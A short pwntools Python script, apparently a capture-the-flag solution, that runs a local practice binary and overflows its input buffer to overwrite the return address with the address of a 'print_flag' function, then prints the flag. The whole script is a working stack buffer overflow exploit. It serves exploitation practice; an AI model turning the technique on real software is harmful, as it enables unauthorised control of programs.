from pwn import *

e = ELF("./hi")
p = process("./hi")
p.sendline(b"A" * 32 + b"a" * 8 + p64(e.functions["print_flag"].address))
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
